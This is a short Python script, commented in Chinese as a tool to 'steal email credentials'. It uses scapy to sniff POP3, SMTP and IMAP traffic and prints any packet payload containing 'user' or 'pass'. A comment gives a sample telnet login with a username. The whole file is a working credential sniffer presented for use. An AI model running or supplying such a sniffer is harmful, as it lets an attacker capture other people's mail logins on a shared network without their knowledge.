#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 窃取 Email 认证

# 测试方法
# $ telnet pop3.163.com 110
# user zengqiu2002
# pass mypassword

import threading
from scapy.all import *

# Our packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload
            
# Fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)